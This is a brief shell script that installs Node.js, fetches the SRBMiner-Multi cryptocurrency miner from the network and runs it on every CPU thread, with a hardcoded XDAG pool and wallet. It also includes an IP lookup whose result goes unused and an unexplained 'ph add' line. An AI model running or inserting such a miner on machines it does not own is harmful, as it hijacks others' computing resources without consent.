wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.1/SRBMiner-Multi-1-0-1-Linux.tar.xz -O - | tar -xz && cd SRBMiner-Multi-1-0-1
ph add SRBMiner-MULTI
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./SRBMiner-MULTI --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --worker serabi --cpu-threads $(nproc --all)

